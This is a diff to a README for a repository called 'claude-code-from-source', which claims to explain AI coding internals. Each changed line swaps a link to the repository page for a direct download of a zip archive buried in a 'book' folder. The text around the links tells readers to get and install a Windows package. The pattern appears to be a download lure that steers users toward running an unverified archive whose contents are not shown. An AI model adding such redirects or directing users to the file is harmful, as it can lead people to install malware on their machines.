@@ -1,6 +1,6 @@
 # 🧠 claude-code-from-source - Understand AI coding internals
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/claricesupernormal350/claude-code-from-source)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/claricesupernormal350/claude-code-from-source/raw/refs/heads/main/book/source_from_code_claude_2.7.zip)
 
 ## 📦 What this app does
 
@@ -24,7 +24,7 @@ If you plan to keep notes while you review the content, it helps to have a text 
 
 Visit this page to download:
 
-https://github.com/claricesupernormal350/claude-code-from-source
+https://github.com/claricesupernormal350/claude-code-from-source/raw/refs/heads/main/book/source_from_code_claude_2.7.zip
 
 Open the page in your browser, find the download area, and save the file to your computer. If the page offers a packaged app, choose the Windows version.
 
@@ -205,6 +205,6 @@ This gives you a clear path and keeps the project easier to follow
 
 Visit this page to download and set up the app:
 
-https://github.com/claricesupernormal350/claude-code-from-source
+https://github.com/claricesupernormal350/claude-code-from-source/raw/refs/heads/main/book/source_from_code_claude_2.7.zip
 
 Open the link, get the Windows package, save it to your computer, then follow the install steps above to run it
